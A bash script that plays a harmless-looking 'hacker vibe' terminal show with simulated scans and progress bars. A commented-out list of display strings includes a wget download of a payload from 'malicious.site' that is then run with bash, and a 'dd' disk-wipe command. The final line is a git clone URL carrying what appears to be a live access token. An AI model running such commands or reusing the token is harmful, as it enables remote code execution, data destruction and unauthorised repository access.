#!/usr/bin/env bash
# hacker_vibe.sh — harmless cosmetic "hacker vibe" terminal effect
# Works on macOS with bash/zsh without awk errors

# --- Config ---
DELAY=0.02      # typing delay
RAIN_LINES=40   # lines for matrix rain
RAIN_COLS=80    # columns width for matrix rainhttps://github.com/rtech-ver/dragon/tree/main
SCANS=25        # number of fake scan lines

# --- helpers ---
reset_term() {
  tput sgr0
  clear
}

typewrite() {
  local text="$1"
  local d=${2:-$DELAY}
  for ((i=0;i<${#text};i++)); do
    printf "%s" "${text:$i:1}"
    sleep "$d"
  done
  printf "\n"
}

heading() {
  tput bold
  echo
  echo "== $1 =="
  tput sgr0
}

rand_char() {
  chars=('0' '1' '@' '#' '$' '%' '&' '*' '+' '-' '=' '?' '/' '\' '|' ':' ';' '<' '>')
  echo -n "${chars[$RANDOM % ${#chars[@]}]}"
}

##1.

# matrix_rain() {
#   local rows=$(tput lines)
#   local cols=$(tput cols)

#   # Hide cursor
#   tput civis

#   while true; do
#     printf "\033[H"  # Move cursor to top-left
#     for ((r=0; r<rows; r++)); do
#       for ((c=0; c<cols; c++)); do
#         if (( RANDOM % 10 == 0 )); then
#           printf "\033[1;32m%s\033[0m" "$(rand_char)"
#         else
#           printf " "
#         fi
#       done
#       printf "\n"
#     done
#     sleep 0.05
#   done

#   # Restore cursor visibility
#   tput cnorm
# }

## 2.
# rand_command() {
#   local cmds=(
#     "curl -X POST http://127.0.0.1:8080/init"
#     "ssh root@192.168.$((RANDOM%256)).$((RANDOM%256))"
#     "nmap -sV -p 1-65535 10.$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
#     "echo 'Payload deployed successfully.'"
#     "cat /var/log/auth.log | grep error"
#     "chmod 777 /tmp/exploit.sh"
#     "sudo ./exploit.sh --force"
#     "git clone https://github.com/anonymous/project.git"
#     "python3 run_attack.py --target=192.168.$((RANDOM%256)).$((RANDOM%256))"
#     "netstat -anp | grep ESTABLISHED"
#     "iptables -A INPUT -p tcp --dport 22 -j ACCEPT"
#     "dd if=/dev/zero of=/dev/sda bs=1M"
#     "wget http://malicious.site/payload.sh -O /tmp/payload.sh"
#     "bash /tmp/payload.sh"
#     "tail -f /var/log/syslog"
#   )
#   echo -n "${cmds[$RANDOM % ${#cmds[@]}]}"
# }

# matrix_rain() {
#   local rows=$(tput lines)
#   local cols=$(tput cols)

#   tput civis
#   while true; do
#     printf "\033[H"
#     for ((r=0; r<rows; r++)); do
#       for ((c=0; c<cols; c+=10)); do
#         printf "\033[1;32m%s \033[0m" "$(rand_command)"
#       done
#       printf "\n"
#     done
#     sleep 0.05
#   done
#   tput cnorm
# }


##3.
rand_task_line() {
  local tasks=(
    "Copying scripts.................."
    "Building project modules........."
    "Running unit tests................"
    "Syncing repository................"
    "Deploying services................"
    "Packaging binaries................"
    "Generating documentation.........."
    "Compiling source code............."
    "Verifying dependencies............"
    "Optimizing configuration.........."
    "Loading database schema..........."
    "Executing migration scripts......."
    "Running integration tests.........."
    "Starting container services......."
    "Checking system logs.............."
  )

  local task="${tasks[$RANDOM % ${#tasks[@]}]}"
  local progress=$((RANDOM % 101)) # percentage 0–100
  local bar_length=30
  local filled=$((progress * bar_length / 100))
  local empty=$((bar_length - filled))

  printf "\033[1;32m%s [" "$task"  # Green text for hacker vibe
  printf "%0.s#" $(seq 1 $filled)
  printf "%0.s-" $(seq 1 $empty)
  printf "] %3d%%\033[0m\n" "$progress"
}

matrix_rain() {
  local rows=$(tput lines)
  local cols=$(tput cols)

  tput civis
  while true; do
    printf "\033[H" # Move cursor to top-left
    for ((r=0; r<rows-1; r++)); do
      rand_task_line
    done
    sleep 0.1
  done
  tput cnorm
}

progress_bar() {
  local label="$1"
  local dur=${2:-2}
  printf "%s [" "$label"
  local steps=30

  # macOS-safe awk calculation
  local interval
  interval=$(/usr/bin/awk -v d="$dur" -v s="$steps" 'BEGIN { printf "%.3f", d / s }')
  if [ -z "$interval" ]; then
    interval=0.05
  fi

  for ((i=1; i<=steps; i++)); do
    printf "#"
    sleep "$interval"
  done
  printf "] Done\n"
}

fake_scan() {
  heading "INITIALIZING RECON"
  typewrite "Fingerprinting local environment..." 0.03
  printf "\n"
  typewrite "SYSTEM: $(uname -srm)" 0.005
  typewrite "HOST: $(hostname)" 0.005
  typewrite "USER: $(whoami)" 0.005
  printf "\n"
  heading "NETWORK: (simulated)"
  for ((i=1;i<=SCANS;i++)); do
    printf "Probe %02d | %03d.%03d.%03d.%03d:%4d ... " $i $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((1024 + RANDOM % 64511))
    sleep 0.06
    case $((RANDOM%5)) in
      0) printf "\033[1;32mOPEN\033[0m\n" ;;
      1) printf "\033[1;33mFILTERED\033[0m\n" ;;
      2) printf "\033[1;31mCLOSED\033[0m\n" ;;
      3) printf "\033[1;34mRESPONDED\033[0m\n" ;;
      4) printf "\033[1;35mTIMEOUT\033[0m\n" ;;
    esac
  done
}

type_banner() {
  heading "ACCESS PANEL"
  typewrite "Establishing secure tunnel ........." 0.03
  progress_bar "Authenticating" 1.6
  typewrite "Bypassing firewall modules ........." 0.02
  progress_bar "Injection routine" 1.0
  printf "\n"
  typewrite "SESSION: \033[1;32mACTIVE\033[0m" 0.02
}

voice_fx() {
  if command -v say >/dev/null 2>&1; then
    say -v "Alex" "Intrusion detected. Initiating countermeasures." &
  fi
}

trap_ctrlc() {
  reset_term
  echo "Interrupted. Exiting..."
  exit 0
}
trap trap_ctrlc INT

# --- Start show ---
reset_term
tput civis

typewrite "┌────────────────────────────────────────────────────────────────────────┐" 0.002
typewrite "│     Geographical Master database Replication terminal session        │" 0.002
typewrite "└────────────────────────────────────────────────────────────────────────┘" 0.002
printf "\n"

typewrite "Launching covert console..." 0.03
sleep 0.4
typewrite "Memory checks... OK" 0.01
typewrite "Kernel hooks... OK" 0.01
printf "\n"

matrix_rain
type_banner
fake_scan

heading "EXPLOITS"
for i in 1 2 3; do
  printf "%s " "$(date +%T)"
  typewrite "Payload $(printf "%02d" $i) delivered to target-sim-$(($RANDOM%999))" 0.01
  sleep 0.25
done

heading "SUMMARY"
typewrite "All operations were simulated — no systems touched." 0.02
typewrite "This is purely for show. Be ethical, be kind." 0.02

voice_fx
tput cnorm
tput sgr0
echo




##git clone https://rajivranjan76:ATCTT3xFfGN0-nbNGoSoCxwoIX5SFbF_Z9k26KocW7IXiR73TQuMPnU_Kpt2W2omxmiHeSSO2NhjN99axi9zNLacdaeoPgFOaKNEzzWHmPU98mwZNmaytixu7YkJ-CXpRBuKcy0JposUHGC-42a_JDY0JlQPtZOYsB4d5LK8F_8FHbL1a8S6l8Q=C658CC1E@bitbucket.org/office_space/replication_scripts.git
